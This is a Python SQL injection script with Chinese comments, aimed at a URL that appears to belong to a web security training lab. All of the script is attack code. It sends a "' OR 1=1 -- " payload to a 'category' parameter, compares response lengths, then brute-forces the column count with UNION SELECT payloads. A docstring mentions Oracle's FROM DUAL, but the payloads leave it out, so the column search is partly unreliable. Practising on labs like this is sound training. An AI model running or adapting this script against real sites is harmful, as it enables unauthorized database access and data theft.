import requests

BASE_URL = "https://0a7f00c803add5bb801f12e600cc00b0.web-security-academy.net/filter"
PARAM_NAME = "category"
TIMEOUT = 10  # 秒

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (SQLi Tester)"
})

def send_request(payload: str) -> requests.Response:
    """送出帶 payload 的 GET request"""
    try:
        return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def detect_sqli():
    """檢測是否存在 SQLi"""
    normal_payload = "Gifts"
    sqli_payload = "' OR 1=1 -- "

    normal_resp = send_request(normal_payload)
    sqli_resp = send_request(sqli_payload)

    if not normal_resp or not sqli_resp:
        print("[!] 無法取得測試回應")
        return False

    print(f"[+] Normal response: {normal_resp.status_code}, len={len(normal_resp.text)}")
    print(f"[+] SQLi   response: {sqli_resp.status_code}, len={len(sqli_resp.text)}")

    if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
        print("[*] 可能存在 SQLi (回應長度異常增加)")
        return True
    else:
        print("[*] 未檢測到明顯 SQLi (基於長度比對)")
        return False

def find_columns(max_columns: int = 20):
    """透過 UNION SELECT 推測欄位數 (Oracle 用 FROM DUAL)"""
    for num in range(1, max_columns + 1):
        payload = "' UNION SELECT " + ",".join(["''"] * num) + "  --"
        resp = send_request(payload)
        if not resp:
            continue

        if resp.status_code == 200 and "ORA-" not in resp.text:
            print(f"[+] 成功: 欄位數可能為 {num}")
            print(f"[+] payload: {payload}")
            return num
        else:
            print(f"[-] 測試 {num} 欄位失敗 (ORA- 錯誤或狀態碼 {resp.status_code})")

    print("[!] 未能在範圍內找到欄位數")
    return None

if __name__ == "__main__":
    print("[*] 開始檢測 SQLi...")
    if detect_sqli():
        print("[*] 嘗試推測欄位數...")
        cols = find_columns()
        if cols:
            print(f"[✔] 最終結果：欄位數 = {cols}")
        else:
            print("[✘] 無法確定欄位數")
